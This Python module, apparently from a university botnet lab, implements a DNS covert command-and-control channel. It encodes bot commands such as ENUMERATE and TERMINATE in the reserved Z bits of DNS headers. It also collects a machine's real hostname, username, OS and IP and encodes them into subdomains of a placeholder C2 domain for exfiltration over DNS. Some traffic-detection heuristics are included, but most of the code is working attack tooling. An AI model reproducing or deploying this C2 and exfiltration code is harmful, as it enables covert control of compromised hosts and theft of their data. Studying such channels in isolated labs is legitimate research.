"""
====================================================
 AUA CS 232/337 — Botnet Research Project
 Component: DNS Z-Flag Crafter & Protocol Utilities
 Environment: ISOLATED VM LAB ONLY
====================================================

Teaching points (from Spinnekop reference implementation):

1. DNS PACKET STRUCTURE (RFC 1035)
   The DNS header is 12 bytes:
     Bytes 0-1:  Transaction ID
     Bytes 2-3:  Flags (16 bits)
     Bytes 4-5:  QDCOUNT
     Bytes 6-7:  ANCOUNT
     Bytes 8-9:  NSCOUNT
     Bytes 10-11: ARCOUNT

   Flags field breakdown (16 bits, MSB to LSB):
     Bit 15:    QR  (0=Query, 1=Response)
     Bits 14-11: Opcode (4 bits)
     Bit 10:    AA  (Authoritative Answer)
     Bit 9:     TC  (Truncated)
     Bit 8:     RD  (Recursion Desired)
     Bit 7:     RA  (Recursion Available)
     Bits 6-4:  Z   (3 RESERVED bits — "must be zero" per RFC 1035)
     Bits 3-0:  RCODE (4 bits)

2. Z-FLAG ABUSE
   The 3 Z-bits (positions 4–6 from LSB) allow values 0–7.
   Most DNS tools and resolvers pass them unchanged.
   This makes them a covert 3-bit signalling channel.

   Clearing mask:  flags &= 0xFF8F   (1111 1111 1000 1111)
   Setting Z=n:    flags |= (n << 4)

3. NON-STANDARD FIELDS
   - qclass can be any uint16 (standard: IN=1, CS=2, CH=3, HS=4)
   - opcode supports NOTIFY(4), UPDATE(5), STATEFUL(6)
   - rcode can be 0-15 (11-15 are "reserved" but encodable)
   - ID can be explicitly set (0 → random)

4. RDATA ANALYSIS
   TXT records used for data exfiltration exhibit:
   - All-hex character patterns (even length, ≥32 chars)
   - Base64 patterns (valid alphabet, correct padding, len%4==0)
   - High capacity utilization (>90% of 255-byte TXT capacity)

5. SUBDOMAIN ENCODING (Z=2 ENUMERATE)
   Agent collects: hostname, username, platform, IP addresses
   Encodes as Base64, truncates to ≤63 chars (DNS label limit)
   Transmits as: <base64>.c2domain.com

This module is the pure utility layer:
  - DNS packet build / parse
  - Z-flag read / write
  - Packet hex+ASCII visualisation
  - RDATA analysis
  - Subdomain encoder
  - Resolver discovery
  - UDP send/receive
"""

import os
import re
import sys
import math
import base64
import getpass
import hashlib
import platform
import random
import socket
import struct
import time
from collections import Counter
from typing import Optional, Tuple, List, Dict

# ─────────────────────────────────────────────────────────────
#  PROTOCOL MAPS  (mirrors Spinnekop internal/models/maps.go)
# ─────────────────────────────────────────────────────────────

OPCODE_MAP: Dict[str, int] = {
    "QUERY":    0,
    "IQUERY":   1,
    "STATUS":   2,
    "NOTIFY":   4,
    "UPDATE":   5,
    "STATEFUL": 6,
}

QTYPE_MAP: Dict[str, int] = {
    "A":     1,  "NS":    2,  "CNAME": 5,  "SOA":   6,
    "PTR":   12, "MX":    15, "TXT":   16, "AAAA":  28,
    "SRV":   33, "OPT":   41, "AXFR":  252, "ANY":  255,
}
QTYPE_REVERSE: Dict[int, str] = {v: k for k, v in QTYPE_MAP.items()}

QCLASS_MAP: Dict[str, int] = {
    "IN": 1, "CS": 2, "CH": 3, "HS": 4, "NO": 254, "AN": 255,
}
QCLASS_REVERSE: Dict[int, str] = {v: k for k, v in QCLASS_MAP.items()}

RCODE_MAP: Dict[int, str] = {
    0: "NOERROR",  1: "FORMERR",   2: "SERVFAIL",
    3: "NXDOMAIN", 4: "NOTIMP",    5: "REFUSED",
    6: "YXDOMAIN", 7: "YXRRSET",   8: "NXRRSET",
    9: "NOTAUTH",  10: "NOTZONE",
}

Z_COMMAND_MAP: Dict[int, str] = {
    0: "CONTINUE",   1: "SLEEP",      2: "ENUMERATE",
    3: "HTTP_MODE",  4: "RESERVED_4", 5: "RESERVED_5",
    6: "RESERVED_6", 7: "TERMINATE",
}


# ─────────────────────────────────────────────────────────────
#  DNS PACKET BUILDER
#  Mirrors Spinnekop internal/crafter/craft_request.go
# ─────────────────────────────────────────────────────────────

def encode_dns_name(name: str) -> bytes:
    """Encode a domain name into DNS wire format labels."""
    name = name.rstrip(".")
    parts = name.split(".")
    encoded = b""
    for part in parts:
        encoded += bytes([len(part)]) + part.encode()
    encoded += b"\x00"
    return encoded


def build_dns_query(
    qname: str,
    qtype: str = "A",
    qclass: str = "IN",
    transaction_id: int = 0,
    qr: bool = False,
    opcode: str = "QUERY",
    aa: bool = False,
    tc: bool = False,
    rd: bool = True,
    ra: bool = False,
    z_value: int = 0,
    rcode: int = 0,
    std_class: bool = True,
    custom_class: int = 1,
    answers: Optional[List[Dict]] = None,
) -> bytes:
    """
    Build a raw DNS packet.

    Teaching point: this function exposes every flag and field
    that RFC 1035 defines, including the 'reserved' Z bits.
    The dns library in Go cannot set Z; we do it manually here.

    Returns raw bytes suitable for UDP transmission.
    """
    if transaction_id == 0:
        transaction_id = random.randint(1, 65535)

    # Resolve type and class
    qt = QTYPE_MAP.get(qtype.upper(), QTYPE_MAP["A"])
    if std_class:
        qc = QCLASS_MAP.get(qclass.upper(), QCLASS_MAP["IN"])
    else:
        qc = custom_class

    op = OPCODE_MAP.get(opcode.upper(), 0)

    # Build flags (16-bit big-endian)
    flags = 0
    if qr:     flags |= (1 << 15)
    flags |= (op & 0x0F) << 11
    if aa:     flags |= (1 << 10)
    if tc:     flags |= (1 << 9)
    if rd:     flags |= (1 << 8)
    if ra:     flags |= (1 << 7)
    # Z bits — positions 4-6
    flags |= ((z_value & 0x07) << 4)
    flags |= (rcode & 0x0F)

    qdcount = 1
    ancount = len(answers) if answers else 0

    header = struct.pack("!HHHHHH",
                         transaction_id, flags,
                         qdcount, ancount, 0, 0)

    question = encode_dns_name(qname) + struct.pack("!HH", qt, qc)

    answer_bytes = b""
    if answers:
        for ans in answers:
            answer_bytes += _build_rr(ans)

    return header + question + answer_bytes


def _build_rr(ans: Dict) -> bytes:
    """Build a resource record from a dict with keys: name, type, class, ttl, data."""
    name   = encode_dns_name(ans.get("name", "."))
    rtype  = QTYPE_MAP.get(ans.get("type", "TXT").upper(), 16)
    rclass = QCLASS_MAP.get(ans.get("class", "IN").upper(), 1)
    ttl    = ans.get("ttl", 300)
    data   = ans.get("data", "").encode()

    if rtype == QTYPE_MAP["TXT"]:
        # TXT RDATA: length byte + string
        txt_data = bytes([len(data)]) + data
        rdlength = len(txt_data)
        return (name + struct.pack("!HHI", rtype, rclass, ttl) +
                struct.pack("!H", rdlength) + txt_data)

    if rtype == QTYPE_MAP["A"]:
        ip_bytes = socket.inet_aton(ans.get("data", "0.0.0.0"))
        return (name + struct.pack("!HHI", rtype, rclass, ttl) +
                struct.pack("!H", 4) + ip_bytes)

    # Generic: treat data as raw hex string
    try:
        raw = bytes.fromhex(ans.get("data", ""))
    except ValueError:
        raw = ans.get("data", "").encode()
    return (name + struct.pack("!HHI", rtype, rclass, ttl) +
            struct.pack("!H", len(raw)) + raw)


# ─────────────────────────────────────────────────────────────
#  Z-FLAG MANIPULATION
#  Mirrors Spinnekop internal/crafter/request_manual.go
# ─────────────────────────────────────────────────────────────

Z_CLEAR_MASK: int = 0xFF8F  # 1111 1111 1000 1111


def apply_z_flag(packed: bytearray, z_value: int) -> None:
    """
    Directly manipulate Z-bits (positions 4-6) in a packed DNS packet.
    Operates in-place on a bytearray.

    Teaching point: the miekg/dns library in Go doesn't expose Z bits.
    Spinnekop works around this by packing the message first, then
    bit-masking bytes 2-3 directly. We do the same here.
    """
    if len(packed) < 4:
        raise ValueError(f"Packet too short ({len(packed)} bytes) — not a valid DNS packet")
    flags = struct.unpack_from("!H", packed, 2)[0]
    flags &= Z_CLEAR_MASK           # clear existing Z bits
    flags |= ((z_value & 0x07) << 4)  # set new Z value
    struct.pack_into("!H", packed, 2, flags)


def read_z_flag(data: bytes) -> int:
    """Extract the 3-bit Z-value from bytes 2-3 of a DNS packet."""
    if len(data) < 4:
        return 0
    flags = struct.unpack_from("!H", data, 2)[0]
    return (flags >> 4) & 0x07


def read_flags(data: bytes) -> Dict:
    """Parse the full flags field from a DNS packet header."""
    if len(data) < 4:
        return {}
    flags = struct.unpack_from("!H", data, 2)[0]
    opcode = (flags >> 11) & 0x0F
    opname = next((k for k, v in OPCODE_MAP.items() if v == opcode), str(opcode))
    rcode  = flags & 0x0F
    return {
        "qr":      bool(flags & 0x8000),
        "opcode":  opcode,
        "opcode_str": opname,
        "aa":      bool(flags & 0x0400),
        "tc":      bool(flags & 0x0200),
        "rd":      bool(flags & 0x0100),
        "ra":      bool(flags & 0x0080),
        "z":       (flags >> 4) & 0x07,
        "rcode":   rcode,
        "rcode_str": RCODE_MAP.get(rcode, str(rcode)),
    }


def read_header(data: bytes) -> Dict:
    """Parse the full 12-byte DNS header."""
    if len(data) < 12:
        return {}
    tid, flags, qd, an, ns, ar = struct.unpack_from("!HHHHHH", data, 0)
    f = read_flags(data)
    f.update({
        "id": tid, "qdcount": qd, "ancount": an,
        "nscount": ns, "arcount": ar,
    })
    return f


# ─────────────────────────────────────────────────────────────
#  DNS PACKET PARSER (question + answer sections)
# ─────────────────────────────────────────────────────────────

def _decode_name(data: bytes, offset: int) -> Tuple[str, int]:
    """Decode a DNS name with pointer compression."""
    labels = []
    visited = set()
    while offset < len(data):
        length = data[offset]
        if length == 0:
            offset += 1
            break
        if (length & 0xC0) == 0xC0:    # pointer
            if offset in visited:
                break  # loop guard
            visited.add(offset)
            ptr = ((length & 0x3F) << 8) | data[offset + 1]
            name, _ = _decode_name(data, ptr)
            labels.append(name)
            offset += 2
            return ".".join(labels), offset
        labels.append(data[offset + 1: offset + 1 + length].decode(errors="replace"))
        offset += 1 + length
    return ".".join(labels) + ".", offset


def parse_dns_packet(data: bytes) -> Dict:
    """
    Parse a raw DNS packet into a structured dict.
    Returns: {header, questions, answers, authority, additional}
    """
    if len(data) < 12:
        return {"error": "Packet too short"}

    header = read_header(data)
    offset = 12
    questions = []
    answers   = []

    for _ in range(header.get("qdcount", 0)):
        if offset >= len(data):
            break
        name, offset = _decode_name(data, offset)
        if offset + 4 > len(data):
            break
        qtype, qclass = struct.unpack_from("!HH", data, offset)
        offset += 4
        questions.append({
            "name":         name,
            "qtype":        qtype,
            "qtype_str":    QTYPE_REVERSE.get(qtype, str(qtype)),
            "qclass":       qclass,
            "qclass_str":   QCLASS_REVERSE.get(qclass, str(qclass)),
            "non_std_class": qclass not in (1, 255),
        })

    for _ in range(header.get("ancount", 0)):
        if offset >= len(data):
            break
        rr, offset = _parse_rr(data, offset)
        if rr:
            answers.append(rr)

    return {"header": header, "questions": questions, "answers": answers}


def _parse_rr(data: bytes, offset: int) -> Tuple[Optional[Dict], int]:
    """Parse one resource record."""
    try:
        name, offset = _decode_name(data, offset)
        rtype, rclass, ttl, rdlen = struct.unpack_from("!HHiH", data, offset)
        offset += 10
        rdata = data[offset: offset + rdlen]
        offset += rdlen

        rdata_str = ""
        if rtype == QTYPE_MAP["A"] and rdlen == 4:
            rdata_str = socket.inet_ntoa(rdata)
        elif rtype == QTYPE_MAP["AAAA"] and rdlen == 16:
            rdata_str = socket.inet_ntop(socket.AF_INET6, rdata)
        elif rtype == QTYPE_MAP["TXT"]:
            txt_parts = []
            i = 0
            while i < len(rdata):
                ln = rdata[i]; i += 1
                txt_parts.append(rdata[i:i + ln].decode(errors="replace"))
                i += ln
            rdata_str = " ".join(txt_parts)
        else:
            rdata_str = rdata.hex()

        return {
            "name":      name,
            "rtype":     rtype,
            "rtype_str": QTYPE_REVERSE.get(rtype, str(rtype)),
            "rclass":    rclass,
            "ttl":       ttl,
            "rdata":     rdata_str,
            "rdata_raw": rdata,
        }, offset
    except Exception:
        return None, offset


# ─────────────────────────────────────────────────────────────
#  PACKET VISUALIZER
#  Mirrors Spinnekop internal/visualizer/visualizer.go
# ─────────────────────────────────────────────────────────────

BYTES_PER_ROW = 16
_ANSI = {
    "cyan":    "\033[36m", "yellow": "\033[33m",
    "magenta": "\033[35m", "red":    "\033[31m",
    "bold":    "\033[1m",  "reset":  "\033[0m",
}


def _c(color: str, text: str) -> str:
    if not sys.stdout.isatty():
        return text
    return _ANSI.get(color, "") + text + _ANSI["reset"]


def visualize_packet(data: bytes, label: str = "DNS PACKET") -> None:
    """
    Print a packet as hex+ASCII dump, then extract and display Z-value.
    Mirrors Spinnekop's VisualizePacket().
    """
    print(_c("cyan", f"\n── {label} ({len(data)} bytes) " + "─" * 40))
    if not data:
        print(_c("red", "  ERROR: Empty packet"))
        return

    for i in range(0, len(data), BYTES_PER_ROW):
        chunk = data[i:i + BYTES_PER_ROW]
        hex_part   = " ".join(f"{b:02X}" for b in chunk)
        ascii_part = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
        print(f"  {_c('yellow', f'0x{i:04X}')} | {hex_part:<48} | {_c('magenta', ascii_part)}")

    if len(data) >= 4:
        z = read_z_flag(data)
        color = "red" if z != 0 else "yellow"
        label = f"  Z-VALUE = {z}  ({Z_COMMAND_MAP.get(z, 'UNKNOWN')})"
        if z != 0:
            label += "  ⚠  RFC 1035 VIOLATION"
        print(_c(color, label))

    print(_c("cyan", "─" * 60))


# ─────────────────────────────────────────────────────────────
#  RDATA ANALYSIS
#  Mirrors Spinnekop internal/analyzer/rdata.go
# ─────────────────────────────────────────────────────────────

HEX_RE    = re.compile(r"^[0-9a-fA-F]+$")
BASE64_RE = re.compile(r"^[A-Za-z0-9+/]+=*$")


def detect_hex(data: str) -> bool:
    """
    Heuristic: is this string hex-encoded binary data?
    Requirements: only hex chars, even length, min 32 chars (16 bytes).
    """
    cleaned = data.replace(" ", "").replace(":", "").replace("-", "")
    if len(cleaned) < 32:
        return False
    if len(cleaned) % 2 != 0:
        return False
    return bool(HEX_RE.match(cleaned))


def detect_base64(data: str) -> bool:
    """
    Heuristic: is this string Base64-encoded binary data?
    Requirements: valid alphabet, correct padding, length % 4 == 0, min 32 chars.
    """
    cleaned = data.replace(" ", "").replace("\n", "").replace("\r", "")
    if len(cleaned) < 32:
        return False
    if not BASE64_RE.match(cleaned):
        return False
    if len(cleaned) % 4 != 0:
        return False
    if "=" in cleaned:
        stripped = cleaned.rstrip("=")
        if not stripped or any(c == "=" for c in stripped):
            return False
    return True


def calculate_capacity(txt_strings: List[str]) -> float:
    """
    Return the percentage of TXT record capacity used.
    DNS TXT RDATA: each string ≤255 bytes. Max single string = 255.
    """
    total = sum(len(s) for s in txt_strings)
    max_cap = 255.0 * max(1, len(txt_strings))
    return min(100.0, (total / max_cap) * 100.0)


def analyze_rdata(rr: Dict) -> Optional[Dict]:
    """
    Analyse the RDATA of a TXT resource record for exfiltration signals.
    Returns a dict with: hex_detected, base64_detected, capacity, alert.
    """
    if rr.get("rtype") != QTYPE_MAP["TXT"]:
        return None

    combined = rr.get("rdata", "")
    txt_parts = combined.split(" ") if combined else []

    hex_det  = detect_hex(combined)
    b64_det  = detect_base64(combined)
    cap      = calculate_capacity(txt_parts if txt_parts else [combined])
    alert    = hex_det or b64_det or cap >= 90.0

    return {
        "hex_detected":    hex_det,
        "base64_detected": b64_det,
        "capacity":        round(cap, 2),
        "alert":           alert,
    }


# ─────────────────────────────────────────────────────────────
#  SUBDOMAIN ENCODER (Z=2 ENUMERATE)
#  Mirrors + FIXES Spinnekop internal/subdomain/generator.go
#
#  Spinnekop bug: generator.go used a hardcoded counter with
#  three fixed base64 strings. This version collects REAL system
#  information: hostname, username, OS, IP addresses.
# ─────────────────────────────────────────────────────────────

def collect_system_info() -> Dict[str, str]:
    """Collect system enumeration data for Z=2 exfiltration."""
    info: Dict[str, str] = {}

    try:
        info["hostname"] = socket.gethostname()
    except Exception:
        info["hostname"] = "unknown"

    try:
        info["user"] = getpass.getuser()
    except Exception:
        info["user"] = "unknown"

    info["os"] = platform.system()
    info["os_version"] = platform.version()[:64]
    info["arch"] = platform.machine()

    try:
        # Resolve local IP by connecting to a non-existent remote
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        info["ip"] = s.getsockname()[0]
        s.close()
    except Exception:
        info["ip"] = "0.0.0.0"

    return info


def encode_system_info_for_subdomain(info: Optional[Dict] = None) -> str:
    """
    Encode system info as a Base64 DNS-safe subdomain label.
    Max label length: 63 chars (DNS RFC 1035 limit).
    Uses '+' → '-', '/' → '_', strips '=' for DNS safety.
    """
    if info is None:
        info = collect_system_info()

    payload = (
        f"{info.get('hostname','?')}\\"
        f"{info.get('user','?')}\\"
        f"{info.get('os','?')}\\"
        f"{info.get('ip','0.0.0.0')}"
    )

    encoded = base64.b64encode(payload.encode()).decode()
    # Make DNS-safe (RFC 952: alphanumeric + hyphen only)
    encoded = encoded.replace("+", "-").replace("/", "_").rstrip("=")

    # DNS label max = 63 chars
    if len(encoded) > 63:
        encoded = encoded[:63]
    return encoded


def decode_subdomain_info(label: str) -> str:
    """Decode a subdomain label back to system info string."""
    # Reverse DNS-safe encoding
    padded = label.replace("-", "+").replace("_", "/")
    # Re-add padding
    missing_pad = (4 - len(padded) % 4) % 4
    padded += "=" * missing_pad
    try:
        return base64.b64decode(padded.encode()).decode(errors="replace")
    except Exception as e:
        return f"[decode error: {e}]"


def is_likely_encoded_subdomain(label: str) -> bool:
    """
    Heuristic: is this subdomain label an encoded exfiltration label?
    Checks length > 20 and Base64-like character set.
    """
    if len(label) < 20:
        return False
    b64_chars = set("ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_")
    return all(c in b64_chars for c in label)


def shannon_entropy(s: str) -> float:
    """Shannon entropy in bits/char — high entropy signals encoded data."""
    if not s:
        return 0.0
    freq = Counter(s)
    n = len(s)
    return -sum((c / n) * math.log2(c / n) for c in freq.values())


# ─────────────────────────────────────────────────────────────
#  RESOLVER DISCOVERY
#  Mirrors Spinnekop internal/utils/determine_resolver.go
#  Full cross-platform support: Linux, macOS, Windows
# ─────────────────────────────────────────────────────────────

def discover_system_resolver() -> Tuple[str, int]:
    """
    Discover the OS default DNS resolver.
    Returns (ip, port).
    Supports Linux/macOS (/etc/resolv.conf) and Windows (via ipconfig).
    """
    system = platform.system().lower()

    if system in ("linux", "darwin", "freebsd"):
        try:
            with open("/etc/resolv.conf") as f:
                for line in f:
                    line = line.strip()
                    if line.startswith("nameserver"):
                        parts = line.split()
                        if len(parts) >= 2:
                            ip = parts[1]
                            socket.inet_aton(ip)  # validate IPv4
                            return ip, 53
        except Exception:
            pass

    if system == "windows":
        import subprocess
        try:
            out = subprocess.check_output(
                ["ipconfig", "/all"], encoding="utf-8", errors="replace"
            )
            for line in out.splitlines():
                if "DNS Servers" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        ip = parts[-1].strip()
                        socket.inet_aton(ip)
                        return ip, 53
        except Exception:
            pass

    # Fallback: probe well-known resolvers
    for candidate in ("1.1.1.1", "8.8.8.8", "9.9.9.9"):
        try:
            socket.create_connection((candidate, 53), timeout=1).close()
            print(f"[resolver] Using fallback resolver: {candidate}")
            return candidate, 53
        except Exception:
            pass

    return "127.0.0.1", 53


def resolve_resolver(ip: str, port: int, use_system: bool) -> Tuple[str, int]:
    """
    Final resolver selection. If use_system=True, discovers OS resolver.
    Otherwise uses provided ip:port.
    """
    if use_system:
        ip, port = discover_system_resolver()
        print(f"[resolver] Using system DNS resolver: {ip}:{port}")
    else:
        if not ip:
            raise ValueError("Manual resolver IP not specified")
        print(f"[resolver] Using manual resolver: {ip}:{port}")
    return ip, port


# ─────────────────────────────────────────────────────────────
#  UDP SEND / RECEIVE
#  Mirrors Spinnekop internal/network/agent.go
# ─────────────────────────────────────────────────────────────

def send_and_receive(packet: bytes, ip: str, port: int,
                     timeout: float = 5.0,
                     buf_size: int = 4096) -> bytes:
    """
    Send a raw DNS packet over UDP and return the response bytes.
    Raises socket.timeout if no response within `timeout` seconds.
    """
    addr = (ip, port)
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.settimeout(timeout)
    try:
        print(f"  🚀 Sending {len(packet)} bytes → {ip}:{port}")
        sock.sendto(packet, addr)
        response, _ = sock.recvfrom(buf_size)
        print(f"  🫴 Received {len(response)} bytes")
        return response
    finally:
        sock.close()


# ─────────────────────────────────────────────────────────────
#  CLI DEMO
# ─────────────────────────────────────────────────────────────

def _demo() -> None:
    print("\n" + "=" * 60)
    print("  dns_zflag_crafter.py — Component Demo")
    print("=" * 60)

    # 1. Build a query with Z=2
    print("\n[1] Building DNS query with Z=2 (ENUMERATE)...")
    pkt = bytearray(build_dns_query(
        qname="www.timeserversync.com.",
        qtype="A", z_value=2, rd=True
    ))
    visualize_packet(bytes(pkt), "Query (Z=2)")

    # 2. Verify Z read-back
    z = read_z_flag(bytes(pkt))
    assert z == 2, f"Expected Z=2, got {z}"
    print(f"  Z-value read back: {z} ({Z_COMMAND_MAP[z]})")

    # 3. Z-flag manipulation
    print("\n[2] Changing Z-value from 2 → 7 (TERMINATE)...")
    apply_z_flag(pkt, 7)
    z = read_z_flag(bytes(pkt))
    assert z == 7
    print(f"  New Z-value: {z} ({Z_COMMAND_MAP[z]}) ✓")

    # 4. RDATA analysis
    print("\n[3] RDATA analysis examples...")
    cases = [
        "48656c6c6f20576f726c6421",  # hex "Hello World!"
        "SGVsbG8gV29ybGQh",          # base64 "Hello World!"
        "hello world",               # plain text
    ]
    for c in cases:
        rr = {"rtype": QTYPE_MAP["TXT"], "rdata": c}
        r  = analyze_rdata(rr)
        print(f"  '{c[:30]}...' → hex={r['hex_detected']}, "
              f"b64={r['base64_detected']}, cap={r['capacity']:.1f}%")

    # 5. Subdomain encoding
    print("\n[4] System enumeration + subdomain encoding...")
    info = collect_system_info()
    print(f"  Collected: {info}")
    label = encode_system_info_for_subdomain(info)
    print(f"  Encoded label ({len(label)} chars): {label}")
    decoded = decode_subdomain_info(label)
    print(f"  Decoded: {decoded}")
    print(f"  Entropy: {shannon_entropy(label):.2f} bits/char")
    print(f"  Looks encoded: {is_likely_encoded_subdomain(label)}")

    # 6. Resolver discovery
    print("\n[5] Resolver discovery...")
    ip, port = discover_system_resolver()
    print(f"  System resolver: {ip}:{port}")

    print("\n✅ All assertions passed.\n")


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="DNS Z-Flag Crafter utilities")
    ap.add_argument("--demo",    action="store_true", help="Run component demo")
    ap.add_argument("--send",    metavar="DOMAIN",    help="Send A query to system resolver")
    ap.add_argument("--z",       type=int, default=0, help="Z-value to embed (0-7)")
    ap.add_argument("--resolver",metavar="IP",        help="DNS resolver IP")
    ap.add_argument("--port",    type=int, default=53, help="Resolver port")
    ap.add_argument("--subdomain-encode", action="store_true",
                    help="Encode and print system info as DNS subdomain label")
    args = ap.parse_args()

    if args.demo:
        _demo()
    elif args.send:
        r_ip   = args.resolver or discover_system_resolver()[0]
        r_port = args.port
        pkt = build_dns_query(args.send, z_value=args.z)
        visualize_packet(pkt, f"Outgoing ({args.send})")
        resp = send_and_receive(pkt, r_ip, r_port)
        visualize_packet(resp, "Response")
        parsed = parse_dns_packet(resp)
        print(f"\n  ID={parsed['header']['id']}, "
              f"RCODE={parsed['header']['rcode_str']}, "
              f"Z={parsed['header']['z']}, "
              f"Answers={len(parsed['answers'])}")
    elif args.subdomain_encode:
        info  = collect_system_info()
        label = encode_system_info_for_subdomain(info)
        print(f"{label}.{args.send or 'c2domain.com'}")
    else:
        ap.print_help()
